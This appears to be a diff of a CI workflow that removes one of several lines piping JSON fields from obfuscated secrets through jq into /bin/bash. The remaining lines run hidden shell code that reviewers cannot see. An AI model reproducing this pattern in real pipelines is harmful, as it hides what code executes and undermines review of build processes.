@@ -23,7 +23,6 @@ jobs:
           ivb55: ${{ secrets.ivb55 }}
         run: |
           printf '%s' "$ivb55" | jq -r .aqreh977 | /bin/bash
-          echo $p941 | jq -r .zdzem877 | /bin/bash
           printf '%s' "$gwpno90" | jq -r .slaos1309 | /bin/bash
           printf '%s' "$o491" | jq -r .iqlbh9099 | /bin/bash
           echo $bh33946 | jq -r .ctq149 | /bin/bash
